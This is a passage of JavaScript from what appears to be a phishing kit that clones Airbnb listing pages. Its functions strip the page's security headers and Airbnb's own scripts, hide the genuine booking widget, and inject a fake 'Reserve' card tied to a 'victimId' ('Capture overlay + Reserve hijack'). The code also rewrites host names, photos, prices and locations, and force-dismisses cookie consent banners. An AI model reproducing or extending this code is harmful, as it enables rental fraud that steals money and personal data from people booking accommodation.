    '  function dayMeta(el){\n' +
    '    if(!el) return null;\n' +
    '    var aria=el.getAttribute("aria-label")||"";\n' +
    '    var tid=el.getAttribute("data-testid")||"";\n' +
    '    if(!aria && el.querySelector){\n' +
    '      var inner=el.querySelector("[aria-label]");\n' +
    '      if(inner) aria=inner.getAttribute("aria-label")||"";\n' +
    '    }\n' +
    '    if(!tid && el.querySelector){\n' +
    '      var inn2=el.querySelector("[data-testid^=calendar-day-]");\n' +
    '      if(inn2) tid=inn2.getAttribute("data-testid")||"";\n' +
    '    }\n' +
    '    // climb for testid if on child of day cell\n' +
    '    if(!tid && el.closest){\n' +
    '      var p=el.closest("[data-testid^=calendar-day-]");\n' +
    '      if(p) tid=p.getAttribute("data-testid")||"";\n' +
    '    }\n' +
    '    var iso=parseDayAria(aria)||parseDayTestId(tid);\n' +
    '    if(!iso) return null;\n' +
    '    var low=(aria+" "+tid).toLowerCase();\n' +
    '    var disabled=el.getAttribute("aria-disabled")==="true"||el.disabled===true||/\\bunavailable\\b|past dates|can.t be selected/i.test(low);\n' +
    '    var checkoutOnly=/only available for checkout/i.test(low);\n' +
    '    if(disabled && !checkoutOnly) return null;\n' +
    '    // if no aria availability text, still allow testid days that are not aria-disabled\n' +
    '    if(aria && !/available|select as check|checkout|check-in date|check-out/i.test(low) && !checkoutOnly){\n' +
    '      // keep if testid present (static donor sometimes omits full aria on nested node)\n' +
    '      if(!tid) return null;\n' +
    '    }\n' +
    '    return {iso:iso, low:low, checkoutOnly:checkoutOnly, aria:aria, tid:tid};\n' +
    '  }\n' +
    '  function applyDay(meta){\n' +
    '    if(!meta||!meta.iso) return false;\n' +
    '    var a=$("mf-cal-in"), b=$("mf-cal-out"); if(!a) return false;\n' +
    '    var pick=window.__MF_PICK||{step:"in"};\n' +
    '    var iso=meta.iso;\n' +
    '    if(pick.step==="in" && !meta.checkoutOnly){\n' +
    '      a.value=iso; if(b){ b.value=""; b.min=iso; }\n' +
    '      pick.step="out"; pick.in=iso; window.__MF_PICK=pick; sync();\n' +
    '      try{ var hi=$("mf-cal-hint"); if(hi) hi.textContent="Selected check-in "+fmt(iso)+" — now pick checkout"; }catch(e){}\n' +
    '      return true;\n' +
    '    }\n' +
    '    var cin=a.value||pick.in;\n' +
    '    if(!cin || iso<=cin){\n' +
    '      a.value=iso; if(b){ b.value=""; b.min=iso; }\n' +
    '      pick.step="out"; pick.in=iso; window.__MF_PICK=pick; sync(); return true;\n' +
    '    }\n' +
    '    if(b) b.value=iso;\n' +
    '    pick.step="in"; pick.out=iso; window.__MF_PICK=pick; sync();\n' +
    '    return true;\n' +
    '  }\n' +
    '  function onDayEvent(ev){\n' +
    '    try{\n' +
    '      var t=ev.target; if(!t||!t.closest) return;\n' +
    '      if(t.closest("#mf-booking-card,#mf-offline-cal,#mf-proxy-overlay,#mf-book-dates,#mf-guests-pop,#mf-photo-lb")) return;\n' +
    '      var btn=findDayEl(t); if(!btn) return;\n' +
    '      var meta=dayMeta(btn); if(!meta) return;\n' +
    '      applyDay(meta);\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  if(!window.__MF_DAY_BRIDGE){\n' +
    '    window.__MF_DAY_BRIDGE=1;\n' +
    '    window.__MF_PICK={step:"in"};\n' +
    '    document.addEventListener("click", onDayEvent, true);\n' +
    '    document.addEventListener("pointerdown", onDayEvent, true);\n' +
    '    // Direct bind on day cells (helps when synthetic clicks miss capture path)\n' +
    '    function armDayCells(){\n' +
    '      try{\n' +
    '        document.querySelectorAll("td[role=button][aria-label],[role=button][aria-label],[data-testid^=calendar-day-]").forEach(function(el){\n' +
    '          if(el.getAttribute("data-mf-day-arm")==="1") return;\n' +
    '          var tid0=el.getAttribute("data-testid")||"";\n' +
    '          if(!dayMeta(el) && tid0.indexOf("calendar-day-")!==0) return;\n' +
    '          el.setAttribute("data-mf-day-arm","1");\n' +
    '          el.addEventListener("click", function(ev){ onDayEvent(ev); }, true);\n' +
    '        });\n' +
    '      }catch(e){}\n' +
    '    }\n' +
    '    armDayCells();\n' +
    '    try{\n' +
    '      var mo=new MutationObserver(function(){ armDayCells(); });\n' +
    '      mo.observe(document.documentElement,{childList:true,subtree:true});\n' +
    '    }catch(e){}\n' +
    '    window.__MF_APPLY_DAY=applyDay;\n' +
    '    window.__MF_DAY_META=dayMeta;\n' +
    '  }\n' +
    '  // Booking card date buttons: scroll to main calendar instead of broken native picker\n' +
    '  function scrollToCal(){\n' +
    '    try{\n' +
    '      var h=Array.from(document.querySelectorAll("h2,h3")).find(function(x){return /select check-in date|choose dates|availability/i.test(x.textContent||"");});\n' +
    '      if(h) h.scrollIntoView({behavior:"smooth",block:"center"});\n' +
    '      else { var oc=$("mf-offline-cal"); if(oc) oc.scrollIntoView({behavior:"smooth",block:"center"}); }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  var bi=$("mf-bi-in"), bo=$("mf-bi-out");\n' +
    '  if(bi){ bi.onclick=function(e){ e.preventDefault(); e.stopPropagation(); window.__MF_PICK={step:"in"}; scrollToCal(); }; }\n' +
    '  if(bo){ bo.onclick=function(e){ e.preventDefault(); e.stopPropagation(); window.__MF_PICK={step:"out",in:($("mf-cal-in")&&$("mf-cal-in").value)||""}; scrollToCal(); }; }\n' +
    '  // Also wire CHECK-IN/CHECKOUT donor-style buttons inside our card\n' +
    '  document.querySelectorAll("#mf-booking-card button,[data-mf-bi]").forEach(function(el){\n' +
    '    var t=((el.getAttribute("data-mf-bi")||"")+" "+(el.innerText||"")).toLowerCase();\n' +
    '    if(/in|check-in/.test(t) && !/guest/.test(t)) el.addEventListener("click", function(e){ e.preventDefault(); window.__MF_PICK={step:"in"}; scrollToCal(); }, true);\n' +
    '    if(/out|checkout|check-out/.test(t)) el.addEventListener("click", function(e){ e.preventDefault(); window.__MF_PICK={step:"out",in:($("mf-cal-in")&&$("mf-cal-in").value)||""}; scrollToCal(); }, true);\n' +
    '  });\n' +
    '  bindGuests();\n' +
    '  sync();\n' +
    '}\n' +
    'if(document.readyState==="loading") document.addEventListener("DOMContentLoaded", bind); else bind();\n' +
    '})();</script>\n';
  // Always refresh calendar/guests script so upgrades apply without re-freeze
  s = s.replace(/<script id="mf-offline-cal-js"[\s\S]*?<\/script>/i, '');
  if (/<\/body>/i.test(s)) s = s.replace(/<\/body>/i, calScript + '</body>');
  else s += calScript;

  return s;
}

/** Capture overlay + Reserve hijack without rewriting asset URLs to _mfpx (offline package). */
function wrapOfflineCapture(html, listingId, victimId, req) {
  // Reuse rewriteProxyHtml capture layer by applying it on a copy that already has local URLs,
  // but skip origin URL rewriting: call inject-only path.
  let s = String(html || '');
  s = s.replace(/<meta[^>]+http-equiv=["']?Content-Security-Policy["']?[^>]*>/gi, '');
  s = s.replace(/<meta[^>]+http-equiv=["']?X-Frame-Options["']?[^>]*>/gi, '');
  // base on our site
  const siteBase = String(reqBase(req)).replace(/\/+$/, '') + '/';
  const baseTag = '<base href="' + siteBase + '">';
  if (/<head[^>]*>/i.test(s)) {
    s = s.replace(/<base[^>]*>/gi, '');
    s = s.replace(/<head([^>]*)>/i, '<head$1>' + baseTag);
  }
  // Use rewriteProxyHtml only for capture chrome: pass a dummy target and then undo _mfpx rewrites on local offline paths
  try {
    s = rewriteProxyHtml(s, MF_DONOR_URL, listingId, reqOrigin(req), victimId, req);
  } catch (e) {
    console.warn('wrapOfflineCapture rewrite failed', e && e.message);
  }
  // Ensure local offline assets were not broken into mfpx
  s = s.replace(/\/_mfpx\/\d+\/u\/[sp]\/a0\.muscache\.com\/offline-airbnb\//g, '/offline-airbnb/');
  s = s.replace(/(https?:\/\/[^"'\/]+)?\/offline-airbnb\//g, '/offline-airbnb/');
  // If rewrite turned /offline-airbnb into hierarchical mfpx of lessjob, restore
  s = s.replace(/\/_mfpx\/\d+\/u\/[sp]\/[^/"']+\/offline-airbnb\//g, '/offline-airbnb/');
  return s;
}

async function buildOfflineAirbnbListingPage(listing, victimId, req) {
  let shell = getOfflineAirbnbShell();
  if (!shell) {
    // fall back to live donor cache if offline package missing
    shell = await getDonorAirbnbShell();
    shell = freezeDonorSpa(shell);
  } else if (!/data-mf-offline="1"|id="mf-freeze"|\/offline-airbnb\/css\//i.test(shell)) {
    shell = freezeDonorSpa(shell);
  }
  let html = injectListingContentIntoDonorHtml(shell, listing, req);
  html = enhanceOfflineListingShell(html, listing, req);
  html = wrapOfflineCapture(html, listing.id, victimId, req);
  return html;
}

/** Keep Airbnb SSR chrome/CSS; strip client bundles so React cannot wipe injected content. */
function freezeDonorSpa(html) {
  let s = String(html);
  s = s.replace(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi, (all, attrs, body) => {
    const a = String(attrs || '');
    if (/type\s*=\s*["']application\/(?:ld\+)?json["']/i.test(a)) return all;
    if (/mf-listing-inject|mf-proxy|__MF_/i.test(a + body)) return all;
    return '';
  });
  s = s.replace(/<meta[^>]+http-equiv=["']?refresh["']?[^>]*>/gi, '');
  // Physically remove cookie consent banners from frozen donor DOM
  try {
    s = s.replace(/data-testid=(["'])main-cookies-banner-container\1[\s\S]{0,50000}?(?:Only necessary|Accept all)[\s\S]{0,5000}?<\/(?:div|section)>/gi, ' data-mf-cookie-gone="1">');
  } catch (e) {}
  s = s.replace(/<section\b[^>]{0,400}>[\s\S]{0,4000}?Help us improve your experience[\s\S]{0,25000}?<\/section>/gi, '<!--mf-cookie-stripped-->');
  s = s.replace(/<div\b[^>]*data-testid=["'](?:main-cookies-banner-container|cookie-banner)["'][^>]*>[\s\S]{0,80000}?<\/div>/gi, (m) => {
    if (m.length > 100000) return m;
    if (/cookie|only necessary|accept all|help us improve/i.test(m)) return '<!--mf-cookie-stripped-->';
    return m;
  });

  s = s.replace(/<button\b[^>]*>\s*Only necessary\s*<\/button>/gi, '<!--mf-cookie-stripped-->');
  s = s.replace(/<button\b[^>]*>\s*Accept all\s*<\/button>/gi, '<!--mf-cookie-stripped-->');
  // Hide cookie / consent overlays server-side (no React handlers after freeze)
  s = s.replace(
    /<\/head>/i,
    '<style id="mf-donor-chrome">[data-testid="modal-container"],[data-testid="cookie-banner"],[data-testid="main-cookies-banner-container"],[data-testid*="cookie" i],div[class*="cookie" i],section[aria-label*="cookie" i],div[aria-label*="Privacy" i],div[aria-label*="cookie" i]{display:none!important;visibility:hidden!important;pointer-events:none!important}[data-testid="book-it-default"],[data-testid="book-it-sidebar"],[data-section-id="BOOK_IT_SIDEBAR"] > :not(#mf-booking-card),[data-section-id="BOOK_IT_FLOATING_FOOTER"]{display:none!important;visibility:hidden!important;pointer-events:none!important;height:0!important;overflow:hidden!important;margin:0!important;padding:0!important;border:0!important}#mf-booking-card{display:block!important;visibility:visible!important;height:auto!important;overflow:visible!important;pointer-events:auto!important}@media (min-width:744px){#mf-proxy-fab{display:none!important}}#mf-photo-lb{display:none;position:fixed;inset:0;z-index:2147483640;background:rgba(0,0,0,.92);align-items:center;justify-content:center;flex-direction:column}#mf-photo-lb.mf-on{display:flex}#mf-photo-lb img{max-width:92vw;max-height:82vh;object-fit:contain;border-radius:8px}#mf-photo-lb .mf-lb-bar{display:flex;gap:16px;margin-top:16px;align-items:center;color:#fff;font:600 15px Circular,system-ui,sans-serif}#mf-photo-lb button{background:rgba(255,255,255,.15);border:0;color:#fff;width:44px;height:44px;border-radius:50%;font-size:22px;cursor:pointer}#mf-photo-lb button:hover{background:rgba(255,255,255,.28)}[data-section-id="HERO_DEFAULT"] img,[data-section-id="HERO_DEFAULT"] button{cursor:pointer}#mf-guests-pop button[data-mf-g]{width:32px;height:32px;border-radius:50%;border:1px solid #b0b0b0;background:#fff;font-size:16px;line-height:1;cursor:pointer;color:#222;display:inline-flex;align-items:center;justify-content:center;padding:0}#mf-guests-pop button[data-mf-g]:disabled{opacity:.35;cursor:not-allowed}</style></head>'
  );
  return s;
}

function formatDescHtml(text) {
  const esc = (s) => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
  const raw = String(text || '').replace(/\r\n/g, '\n').trim();
  if (!raw) return '<p>No description provided.</p>';
  const lines = raw.split('\n').map(l => l.trim()).filter(Boolean);
  if (!lines.length) return '<p>No description provided.</p>';
  const isBullet = (l) => /^[-•*]\s+/.test(l);
  const isShortFeature = (l) => l.length <= 160 && !/[.!?]\s+[A-Z]/.test(l);
  const html = [];
  let i = 0;
  while (i < lines.length) {
    const line = lines[i];
    if (isBullet(line)) {
      const items = [];
      while (i < lines.length && (isBullet(lines[i]) || (isShortFeature(lines[i]) && lines[i].length < 140))) {
        items.push(lines[i].replace(/^[-•*]\s+/, ''));
        i++;
        if (i < lines.length && !isBullet(lines[i]) && lines[i].length > 160) break;
      }
      html.push(`<ul class="ab-desc-list">${items.map(it => `<li>${esc(it)}</li>`).join('')}</ul>`);
      continue;
    }
    if (/[:：]\s*$/.test(line) && i + 1 < lines.length) {
      html.push(`<p>${esc(line)}</p>`);
      i++;
      const items = [];
      while (i < lines.length && isShortFeature(lines[i]) && lines[i].length <= 160) {
        if (lines[i].length > 170 || (/[.!?]/.test(lines[i]) && lines[i].length > 140)) break;
        items.push(lines[i].replace(/^[-•*]\s+/, ''));
        i++;
      }
      if (items.length) html.push(`<ul class="ab-desc-list">${items.map(it => `<li>${esc(it)}</li>`).join('')}</ul>`);
      continue;
    }
    html.push(`<p>${esc(line)}</p>`);
    i++;
  }
  return html.join('');
}

function injectListingContentIntoDonorHtml(html, listing, req) {
  const p = buildListingInjectPayload(listing, req);
  p.descHtml = formatDescHtml(p.desc);
  let s = String(html);

  s = s.replace(
    /<title[^>]*>[\s\S]*?<\/title>/i,
    '<title>' + esc(p.title) + (p.loc ? ' - Apartments for Rent in ' + esc(p.loc) : '') + ' | Airbnb</title>'
  );
  s = s.replace(
    /(<meta[^>]+property=["']og:title["'][^>]*content=)(["'])[^"']*\2/i,
    '$1$2' + esc(p.title) + '$2'
  );
  s = s.replace(
    /(<meta[^>]+content=)(["'])[^"']*\2([^>]+property=["']og:title["'])/i,
    '$1$2' + esc(p.title) + '$2$3'
  );
  if (p.imgs[0]) {
    s = s.replace(
      /(<meta[^>]+property=["']og:image["'][^>]*content=)(["'])[^"']*\2/i,
      '$1$2' + esc(p.imgs[0]) + '$2'
    );
  }

  // Server-side hero image swap (visible without JS)
  if (p.imgs.length) {
    let hi = 0;
    s = s.replace(/(data-section-id="HERO_DEFAULT"[\s\S]{0,120000}?)(?=data-section-id="|$)/i, (hero) => {
      return hero.replace(/https:\/\/a0\.muscache\.com\/im\/pictures\/(?!AirbnbPlatformAssets)[^"'\\\s>]+/gi, () => {
        const u = p.imgs[hi % p.imgs.length];
        hi += 1;
        return u;
      });
    });
    let gi = 0;
    s = s.replace(/https:\/\/a0\.muscache\.com\/im\/pictures\/(?!AirbnbPlatformAssets)[0-9a-fA-F/_-]+\.(?:jpg|jpeg|png|webp)[^"'\\\s>]*/gi, (m) => {
      if (gi >= p.imgs.length * 12) return m;
      const u = p.imgs[gi % p.imgs.length];
      gi += 1;
      return u;
    });
  }

  s = s.replace(/(data-section-id="TITLE_DEFAULT"[\s\S]{0,4000}?<h1\b[^>]*>)([\s\S]*?)(<\/h1>)/i, (all, a, _b, c) => a + esc(p.title) + c);
  s = s.replace(/Hosted by [^<]{1,60}/g, 'Hosted by ' + esc(p.host));
  if (p.loc) {
    s = s.replace(/Entire (?:rental unit|condo|home|loft|place|apartment|serviced apartment|flat) in [^<]{2,120}/gi,
      esc(String(p.ptype || 'Entire rental unit')) + ' in ' + esc(p.loc));
    s = s.replace(/\b(in )(?:Paris|London|Birmingham|New York|Rome|Barcelona|Berlin|Madrid|Lisbon|Amsterdam|Milan)(?:,?\s*(?:France|UK|United Kingdom|England|West Midlands|USA|Italy|Spain|Germany|Portugal|Netherlands))?\b/gi,
      '$1' + esc(p.loc));
  } else if (p.ptype) {
    s = s.replace(/Entire (rental unit|condo|home|loft|place|apartment|serviced apartment|flat)/gi, () => String(p.ptype));
  }

  // Donor host leftovers (Paris Yvon shell + UK Sophie shell)
  const hostEsc = esc(p.host);
  s = s.replace(/\bYvon\b/g, hostEsc);
  s = s.replace(/\bSophie\b/g, hostEsc);
  s = s.replace(/(?:Yvon|Sophie) is a Superhost/gi, hostEsc + ' is a Superhost');
  s = s.replace(/Learn more about the host,\s*(?:Yvon|Sophie)/gi, 'Learn more about the host, ' + hostEsc);
  s = s.replace(/aria-label="Learn more about the host,\s*(?:Yvon|Sophie)\."/gi, 'aria-label="Learn more about the host, ' + hostEsc + '."');

  if (p.loc) {
    const locEsc = esc(p.loc);
    const locJson = locEsc.replace(/"/g, '');
    s = s.replace(/Paris,?\s*Île-de-France,?\s*France/gi, locEsc);
    s = s.replace(/Paris,?\s*France/gi, locEsc);
    s = s.replace(/Birmingham,?\s*West Midlands,?\s*(?:United Kingdom|UK|England)?/gi, locEsc);
    s = s.replace(/West Midlands,?\s*(?:United Kingdom|UK|England)/gi, locEsc);
    s = s.replace(/Flats for Rent in West Midlands/gi, 'Apartments for Rent in ' + locEsc);
    s = s.replace(/Apartments for Rent in West Midlands/gi, 'Apartments for Rent in ' + locEsc);
    s = s.replace(/"addressLocality"\s*:\s*"(?:Paris|Birmingham)"/g, '"addressLocality":"' + locJson + '"');
    s = s.replace(/"city"\s*:\s*"(?:Paris|Birmingham)"/g, '"city":"' + locJson + '"');
    s = s.replace(/"localizedLocation"\s*:\s*"[^"]*"/g, '"localizedLocation":"' + locJson + '"');
    s = s.replace(/"subtitle"\s*:\s*"[^"]*(?:Paris|Birmingham|West Midlands)[^"]*"/g, '"subtitle":"' + locJson + '"');
    s = s.replace(/53 m2 accommodation near the Eiffel Tower and Champs-Elysées/gi, esc(p.title));
    s = s.replace(/#180 Urban Skyline Retreat Birmingham[^<]{0,80}/gi, esc(p.title));
    s = s.replace(/Urban Skyline Retreat Birmingham[^<"]{0,40}/gi, esc(p.title));
    s = s.replace(/Explore other options in and around (?:Paris|Birmingham)/gi, 'Explore other options in and around ' + locEsc);
    s = s.replace(/\bBirmingham(?:'s)?\b/gi, locEsc);
    s = s.replace(/\bWest Midlands\b/gi, locEsc);
  }

  // Server-side description body (preserves paragraphs / <br>)
  if (p.descHtml) {
    s = s.replace(
      /(data-section-id="DESCRIPTION_DEFAULT"[\s\S]{0,2000}?<span class="l1h825yc[^"]*"[^>]*>)([\s\S]*?)(<\/span>\s*<\/span>)/i,
      (all, a, _body, c) => a + p.descHtml + c
    );
  }

  const payloadJson = JSON.stringify(p);
  const injectScript =
    '\n<script id="mf-listing-inject">\n' +
    '(function(){\n' +
    '  var P = ' +
    payloadJson +
    ';\n' +
    '  function setText(el,t){ if(el) try{ el.textContent=t; }catch(e){} }\n' +
    '  function lastSec(id){ var all=document.querySelectorAll(\'[data-section-id="\'+id+\'"]\'); return all.length?all[all.length-1]:null; }\n' +
    '  function lastQs(sel){ var all=document.querySelectorAll(sel); return all.length?all[all.length-1]:null; }\n' +
    '  function escHtml(t){ return String(t==null?"":t).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;").replace(/"/g,"&quot;"); }\n' +
    '  function descToHtml(d){\n' +
    '    if(P.descHtml) return P.descHtml;\n' +
    '    var raw=String(d||"").replace(/\\r\\n/g,"\\n").replace(/\\r/g,"\\n").trim(); if(!raw) return "";\n' +
    '    return raw.split(/\\n{2,}/).map(function(b){\n' +
    '      b=b.trim(); if(!b) return "";\n' +
    '      var lines=b.split("\\n").map(function(l){return l.trim();}).filter(Boolean);\n' +
    '      if(lines.length===1 && lines[0].length<48 && !/[.!?]$/.test(lines[0]))\n' +
    '        return \'<span class="_g5uevq" style="font-weight:600;display:block;margin:12px 0 4px">\'+escHtml(lines[0])+\'</span>\';\n' +
    '      if(lines[0].length<48 && !/[.!?]$/.test(lines[0]) && lines.length>1)\n' +
    '        return \'<span class="_g5uevq" style="font-weight:600;display:block;margin:14px 0 6px">\'+escHtml(lines[0])+\'</span>\'+escHtml(lines.slice(1).join("\\n")).replace(/\\n/g,"<br>");\n' +
    '      return escHtml(lines.join("\\n")).replace(/\\n/g,"<br>");\n' +
    '    }).filter(Boolean).join("<br><br>");\n' +
    '  }\n' +
    '  function replaceImgs(){\n' +
    '    try {\n' +
    '      var list=P.imgs||[]; if(!list.length) return;\n' +
    '      var roots=[lastSec("HERO_DEFAULT"),lastSec("SLEEPING_ARRANGEMENT_WITH_IMAGES"),document.body];\n' +
    '      var seen=0;\n' +
    '      for(var r=0;r<roots.length;r++){\n' +
    '        if(!roots[r]) continue;\n' +
    '        var imgs=roots[r].querySelectorAll("img");\n' +
    '        for(var i=0;i<imgs.length;i++){\n' +
    '          var url=list[seen%list.length]; seen++;\n' +
    '          try{\n' +
    '            imgs[i].src=url; imgs[i].srcset=url;\n' +
    '            imgs[i].setAttribute("data-original-uri",url);\n' +
    '            imgs[i].setAttribute("data-mf-photo", String((seen-1)%list.length));\n' +
    '            var pic=imgs[i].closest("picture");\n' +
    '            if(pic){ var ss=pic.querySelectorAll("source"); for(var k=0;k<ss.length;k++) ss[k].srcset=url; }\n' +
    '          }catch(e){}\n' +
    '          if(roots[r]!==document.body && seen>=list.length*3) break;\n' +
    '          if(roots[r]===document.body && seen>=list.length*2) break;\n' +
    '        }\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function replaceTitle(){\n' +
    '    try{\n' +
    '      var tsec=lastSec("TITLE_DEFAULT"); var h1=(tsec&&tsec.querySelector("h1"))||document.querySelector("h1");\n' +
    '      setText(h1,P.title);\n' +
    '      document.title=P.title+(P.loc?(" - Apartments for Rent in "+P.loc):"")+" | Airbnb";\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function replaceHost(){\n' +
    '    try{\n' +
    '      var walk=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null); var n;\n' +
    '      while(n=walk.nextNode()){\n' +
    '        var t=n.nodeValue; if(!t) continue;\n' +
    '        if(/Hosted by\\s+\\S+/i.test(t)) n.nodeValue=t.replace(/Hosted by\\s+[^\\n]+/i,"Hosted by "+P.host);\n' +
    '        if(/\\b(?:Yvon|Sophie)\\b/i.test(t)) n.nodeValue=t.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host);\n' +
    '      }\n' +
    '      if(P.hostPhoto){\n' +
    '        var hostSec=lastSec("HOST_OVERVIEW_DEFAULT")||lastSec("MEET_YOUR_HOST")||lastSec("HOST_PROFILE_DEFAULT")||lastSec("OVERVIEW_DEFAULT_V2");\n' +
    '        if(hostSec){\n' +
    '          var himg=hostSec.querySelectorAll("img");\n' +
    '          for(var i=0;i<himg.length;i++){ try{ himg[i].src=P.hostPhoto; himg[i].srcset=P.hostPhoto; }catch(e){} }\n' +
    '        }\n' +
    '        var avatars=document.querySelectorAll(\'img[data-testid="host-profile-image"], img[alt*="Yvon"], img[alt*="Sophie"], img[alt*="Host"]\');\n' +
    '        for(var j=0;j<avatars.length;j++){ try{ avatars[j].src=P.hostPhoto; avatars[j].srcset=P.hostPhoto; if(avatars[j].alt) avatars[j].alt=P.host; }catch(e){} }\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function replacePrice(){\n' +
    '    try{\n' +
    '      var box=lastQs(\'[data-testid="book-it-default"]\')||lastSec("BOOK_IT_SIDEBAR");\n' +
    '      if(!box) return;\n' +
    '      var walk=document.createTreeWalker(box,NodeFilter.SHOW_TEXT,null); var n; var done=0;\n' +
    '      while(n=walk.nextNode()){\n' +
    '        var t=n.nodeValue; if(!t||!/\\d/.test(t)) continue;\n' +
    '        if(/night|noapte|nuit|noche|month|total/i.test(t) || /[€$£]/.test(t)){\n' +
    '          var val=P.hideNightly?(P.priceMonth||P.priceNight):P.priceNight;\n' +
    '          if(!val) continue;\n' +
    '          var next=t.replace(/[€$£]\\s*[\\d,.]+|[\\d,.]+\\s*[€$£]/, P.sym+val);\n' +
    '          if(P.hideNightly) next=next.replace(/\\bnight\\b/ig,"month");\n' +
    '          n.nodeValue=next; done++; if(done>6) break;\n' +
    '        }\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function replaceDesc(){\n' +
    '    if(!P.desc && !P.descHtml) return;\n' +
    '    try{\n' +
    '      var sec=lastSec("DESCRIPTION_DEFAULT");\n' +
    '      if(!sec) return;\n' +
    '      var html=descToHtml(P.desc);\n' +
    '      var clamp=sec.querySelector(\'div[style*="-webkit-line-clamp"], div[style*="line-clamp"]\');\n' +
    '      var target=null;\n' +
    '      if(clamp){\n' +
    '        var inner=clamp.querySelector("span.l1h825yc")||clamp.querySelector("span span")||clamp.querySelector("span");\n' +
    '        target=inner||clamp;\n' +
    '      }\n' +
    '      if(!target){\n' +
    '        var nodes=sec.querySelectorAll("span,p,div"); var best=null,bestLen=0;\n' +
    '        for(var i=0;i<nodes.length;i++){\n' +
    '          var t=(nodes[i].innerText||"").trim();\n' +
    '          if(t.length>bestLen && t.length>40){ best=nodes[i]; bestLen=t.length; }\n' +
    '        }\n' +
    '        target=best;\n' +
    '      }\n' +
    '      if(target){\n' +
    '        target.innerHTML=html;\n' +
    '        if(clamp){ clamp.style.webkitLineClamp="unset"; clamp.style.display="block"; clamp.style.overflow="visible"; }\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function replaceOverview(){\n' +
    '    try{\n' +
    '      var sec=lastSec("OVERVIEW_DEFAULT_V2")||document.body;\n' +
    '      var osec=lastSec("OVERVIEW_DEFAULT_V2"); var h2=osec&&(osec.querySelector("h2")||osec.querySelector("h1"));\n' +
    '      if(h2 && P.loc){ h2.textContent=(P.ptype||"Entire rental unit")+" in "+P.loc; }\n' +
    '      var walk=document.createTreeWalker(sec,NodeFilter.SHOW_TEXT,null); var n;\n' +
    '      while(n=walk.nextNode()){\n' +
    '        var t=n.nodeValue||"";\n' +
    '        if(/\\d+\\s+guests?/i.test(t)) n.nodeValue=t.replace(/\\d+\\s+guests?/i, P.guests+(P.guests==1?" guest":" guests"));\n' +
    '        if(/\\d+\\s+bedrooms?/i.test(t)) n.nodeValue=t.replace(/\\d+\\s+bedrooms?/i, P.bedrooms+(P.bedrooms==1?" bedroom":" bedrooms"));\n' +
    '        if(/\\d+\\s+beds?\\b/i.test(t) && !/bedroom/i.test(t)) n.nodeValue=t.replace(/\\d+\\s+beds?/i, P.beds+(P.beds==1?" bed":" beds"));\n' +
    '        if(/\\d+(\\.\\d+)?\\s+baths?/i.test(t)) n.nodeValue=t.replace(/\\d+(\\.\\d+)?\\s+baths?/i, P.baths+(P.baths==1?" bath":" baths"));\n' +
    '        if(/\\b(?:Yvon|Sophie)\\b/i.test(t)) n.nodeValue=t.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host);\n' +
    '        if(P.loc && /(?:Paris|Birmingham)/i.test(t)) n.nodeValue=t.replace(/(?:Paris,?\\s*(?:Île-de-France,?\\s*)?France|Birmingham,?\\s*West Midlands(?:,?\\s*(?:UK|United Kingdom|England))?|\\bBirmingham\\b|\\bParis\\b)/gi, P.loc);\n' +
    '      }\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function dismissCookies(){\n' +
    '    try{\n' +
    '      var btns=Array.from(document.querySelectorAll("button,a"));\n' +
    '      btns.forEach(function(x){\n' +
    '        var t=(x.innerText||x.getAttribute("aria-label")||"").trim();\n' +
    '        if(!/only necessary|accept all|^accept$|ok$|got it|^agree$/i.test(t)) return;\n' +
    '        try{ x.click(); }catch(e){}\n' +
    '        try{\n' +
    '          var el=x;\n' +
    '          for(var up=0; up<14 && el; up++){\n' +
    '            var tt=(el.innerText||"");\n' +
    '            var tid=el.getAttribute && (el.getAttribute("data-testid")||"");\n' +
    '            if(/cookie|main-cookies|modal-container/i.test(tid) || (tt.length<8000 && /only necessary|we use cookies|help us improve|accept all/i.test(tt))){\n' +
    '              el.style.cssText="display:none!important;visibility:hidden!important"; el.remove(); break;\n' +
    '            }\n' +
    '            el=el.parentElement;\n' +
    '          }\n' +
    '          x.remove();\n' +
    '        }catch(e){}\n' +
    '      });\n' +
    '      var sels=[\'[data-testid="modal-container"]\',\'[data-testid="cookie-banner"]\',\'[data-testid="main-cookies-banner-container"]\',\'div[class*="cookie" i]\',\'section[aria-label*="cookie" i]\',\'div[aria-label*="cookie" i]\',\'div[aria-label*="Privacy" i]\'];\n' +
    '      for(var i=0;i<sels.length;i++){\n' +
    '        try{ document.querySelectorAll(sels[i]).forEach(function(el){ try{ el.style.cssText="display:none!important;visibility:hidden!important"; el.remove(); }catch(e){} }); }catch(e){}\n' +
    '      }\n' +
    '      document.querySelectorAll(\'div[role="dialog"], aside, section\').forEach(function(el){\n' +
    '        var t=(el.innerText||""); if(/help us improve your experience|we use cookies|only necessary|accept all|cookie policy|privacy preference/i.test(t) && t.length<8000){ try{ el.style.cssText="display:none!important;visibility:hidden!important"; el.remove(); }catch(e){} }\n' +
    '      });\n' +
    '      try{ document.documentElement.style.overflow=""; document.body.style.overflow=""; }catch(e){}\n' +
    '    }catch(e){}\n' +
    '  }\n' +
    '  function scrubDonor(){\n' +
    '    try{\n' +
    '      var walk=document.createTreeWalker(document.body,NodeFilter.SHOW_TEXT,null); var n;\n' +
    '      while(n=walk.nextNode()){\n' +
    '        var t=n.nodeValue; if(!t) continue;\n' +
    '        var next=t;\n' +
    '        if(/\\b(?:Yvon|Sophie)\\b/i.test(next)) next=next.replace(/\\b(?:Yvon|Sophie)\\b/gi, P.host);\n' +
    '        if(P.loc){\n' +
    '          next=next.replace(/Paris,?\\s*Île-de-France,?\\s*France/gi, P.loc);\n' +
    '          next=next.replace(/Paris,?\\s*France/gi, P.loc);\n' +
